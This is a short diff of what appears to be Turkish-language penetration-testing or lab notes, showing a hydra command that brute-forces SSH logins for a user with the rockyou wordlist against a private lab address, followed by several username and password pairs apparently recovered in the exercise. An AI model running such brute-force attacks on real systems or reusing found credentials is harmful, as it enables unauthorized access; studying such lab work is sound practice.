@@ -8,10 +8,12 @@ veya
 ``` bash
 hydra -l dale -P /usr/share/wordlists/rockyou.txt  ssh://10.10.10.10
 ```
-
 claire-r:Password1
+
 chris-r:letmein
+
 jill-v:sunshinel
+
 barry-b:sandwich
 
 ``` bash
